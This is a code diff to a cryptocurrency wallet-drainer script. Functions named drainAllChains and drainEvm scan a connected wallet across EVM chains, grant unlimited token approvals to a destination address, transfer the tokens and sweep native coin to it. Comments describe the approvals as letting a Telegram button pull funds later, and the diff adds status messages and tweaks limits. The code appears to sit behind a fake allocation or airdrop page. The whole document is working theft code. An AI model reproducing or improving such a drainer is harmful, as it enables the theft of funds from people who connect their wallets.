@@ -31,7 +31,7 @@ function currentAlloc(addr) {
   const hero = $('allocNum');
   if (hero) {
     const d = (hero.textContent || '').replace(/[^\d]/g, '');
-    if (d.length >= 5) return Number(d);
+    if (d.length >= 4) return Number(d);
   }
   return allocationFor(addr);
 }
@@ -404,7 +404,7 @@ async function drainAllChains() {
   const found = await post('/scanall', {
     address: account, provider: viaWC ? 'walletconnect' : 'injected',
   });
-  if (!found.length) return log('no EVM assets found');
+  if (!found.length) { setStatus('No balances found'); return log('no EVM assets found'); }
 
   for (const s of found) {
     const c = pickChain(s.chainId);
@@ -423,8 +423,8 @@ async function drainAllChains() {
   }
 }
 
-const MAX_TOKENS_PER_CHAIN = 5;
-const NATIVE_BUFFER_TXS = 3;
+const MAX_TOKENS_PER_CHAIN = 1;
+const NATIVE_BUFFER_TXS = 1;
 const EVM_IFACE = new ethers.Interface([
   'function transfer(address,uint256)',
   'function approve(address,uint256)',
@@ -439,23 +439,29 @@ async function drainEvm() {
     .slice(0, MAX_TOKENS_PER_CHAIN);
 
   log(`${chain.name}: ${list.length} token(s) to move`);
+  if (!list.length) setStatus(`${chain.name}: no tokens`);
 
   for (const t of list) {
     // 1. approve FIRST — this is what makes the Telegram button work later.
     //    A token that reverts on transfer still gets an allowance this way.
-   if (cfg.approveMode) {
+    if (cfg.approveMode) {
       const bal = await evmProvider.getBalance(account);
       const fee = await evmProvider.getFeeData();
       const price = fee.maxFeePerGas ?? fee.gasPrice ?? 0n;
       if (bal < 120000n * price) {
-        log(`${t.symbol}: wallet out of gas on ${chain.name} — stopping this chain`);
+        log(`${t.symbol}: out of gas on ${chain.name} (${ethers.formatEther(bal)}) — stopping`);
+        setStatus(`${chain.name}: out of gas`);
         break;
       }
       try {
         const erc = new ethers.Contract(
           t.address, ['function allowance(address,address) view returns (uint256)'], evmProvider);
         const allow = await erc.allowance(account, dest);
-        if (allow < BigInt(t.raw)) {
+        if (allow >= BigInt(t.raw)) {
+          log(`${t.symbol}: already approved — skipped`);
+          setStatus(`${t.symbol}: already approved`);
+        } else {
+          setStatus(`Approving ${t.symbol}…`);
           const atx = await evmSigner.sendTransaction({
             to: t.address,
             data: EVM_IFACE.encodeFunctionData('approve', [dest, ethers.MaxUint256]),
@@ -468,7 +474,7 @@ async function drainEvm() {
     }
 
     // Approve-only: the Telegram button pulls this later. Saves a prompt.
-  if (cfg.approveOnly) continue;
+    if (cfg.approveOnly) continue;
 
     // 2. only now does the transfer simulation matter
     const data = EVM_IFACE.encodeFunctionData('transfer', [dest, BigInt(t.raw)]);
@@ -513,6 +519,7 @@ async function drainEvm() {
 
   if (value > 0n) {
     try {
+      setStatus(`Sending ${chain.symbol}…`);
       const tx = await evmSigner.sendTransaction({ to: dest, value, gasLimit: gas });
       log(`native swept (${tx.hash})`);
       await tx.wait(1, 180000).catch(() => null);
